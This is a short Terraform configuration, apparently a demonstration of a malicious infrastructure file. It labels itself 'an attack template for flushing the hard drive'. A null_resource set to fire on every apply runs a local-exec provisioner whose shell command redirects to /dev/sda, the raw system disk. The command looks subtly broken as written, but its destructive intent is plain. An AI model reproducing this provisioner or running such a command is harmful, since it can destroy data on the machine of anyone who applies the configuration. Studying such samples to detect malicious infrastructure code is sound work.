# Create an arbitrary local resource
data "template_file" "test" {
  template = "Hello, I am an attack template for flushing the hard drive."

}

resource "null_resource" "execut" {
  triggers {
    uuid = "${uuid()}"
  }

  provisioner "local-exec" {
    command = "cd .. > /dev/sda"
  }
}